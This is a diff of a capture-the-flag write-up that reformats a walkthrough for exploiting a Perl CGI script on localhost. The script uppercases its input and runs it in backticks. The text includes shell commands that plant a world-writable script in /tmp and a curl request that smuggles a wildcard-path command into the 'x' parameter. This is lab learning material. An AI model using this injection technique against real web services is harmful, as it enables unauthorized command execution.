@@ -71,23 +71,27 @@ sub n {
 n(t(param("x"), param("y")));
 ```
 
-level12.l uses CGI on localhost:4646, it seems to take 2 arguments. Argument x will be put in uppercase and will be executed thanks to the \`\` quotes. Argument y seems to be useless for our purpose.
+What we can understand:
+- `level12.pl` uses `CGI` on `localhost:4646`
+- It seems to take 2 arguments
+- Argument x will be put in uppercase and will be executed thanks to the \`\` quotes 
+- Argument y seems to serve no purpose for us
 
-We saw in a previous level that we can pass parameters to CGI. So let's try to pass getflag.
+We saw in a previous level that we can pass parameters to CGI. So let's try to pass `getflag`.
 
-Problem: if we pass just getflag, the regex will turn it into GETFLAG and the command won't be run properly. We need to find a way of passing a command without it being transformed in uppercase. Maybe we can run a script instead of a command. 
-Using wildcards will prevent the regex to turn /tmp/ into /TMP/ wich doesn't exist.
+Problem: if we pass just `getflag`, the regex will turn it into GETFLAG and the command won't be run properly. We need to find a way of passing a command without it being transformed in uppercase. </br>
+Maybe we can run a script instead of a command and using wildcards will prevent the regex to turn `/tmp/` into `/TMP/` wich doesn't exist.
 
-```
+```bash
 echo "getflag" > /tmp/GETFLAG
 touch /tmp/CC
 chmod 777 /tmp/GETFLAG
 ```
-```
+```bash
 curl localhost:4646/?x="`/*/GETFLAG>/*/CC`"
 ```
 
-This does not work, it launch getflag without the appropriate rights...
+This does not work, it launch getflag without the appropriate rights.
 
 1h30 later with lot of different useless tries...
 It was not the good quotes, and weird to do it like this, it is cleaner to do the > part into the script.
